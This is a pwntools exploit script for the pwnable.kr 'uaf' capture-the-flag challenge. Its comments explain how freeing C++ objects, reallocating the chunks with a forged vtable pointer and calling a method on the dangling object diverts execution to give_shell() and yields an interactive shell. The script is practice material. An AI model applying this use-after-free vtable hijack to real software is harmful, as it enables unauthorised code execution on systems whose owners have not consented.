from pwn import *
import sys

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    proc = ssh("uaf", "pwnable.kr", password="guest", port=2222)
    p = proc.process("./uaf 17 /tmp/ghostly/file", shell=True)

else:
    p = process("./uaf 17 file", shell=True)
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """set disassembly-flavor intel
               b main
               """)

def free():
    p.recvuntil("free")
    p.sendline("3")

def allocate():
    p.recvuntil("free")
    p.sendline("2")

def use_functions():
    p.recvuntil("free")
    p.sendline("1")

# 3 will call destructors on created objects, freeing the fastbin chunks of size 0x20 and 0x30 associated with them
free()

# allocate twice, two chunks of size 0x20 (since we read in 17 bytes from file), to write at the freed chunks
# the first 4 bytes of file are man's vtable - 8, which are written into the area where the woman and man's vtable ptrs used to be. 
allocate()
allocate()

# Now the UAF. 
# The function introduce() is called on the freed objects, which still point to the same location on the heap. 
# Normally, it would have called vptr + 8. 
# Since we've overwritten the vptr when allocating the file content, vtable-8+8 = give_shell() is called when man->introduce() is called. 
use_functions()
p.interactive()
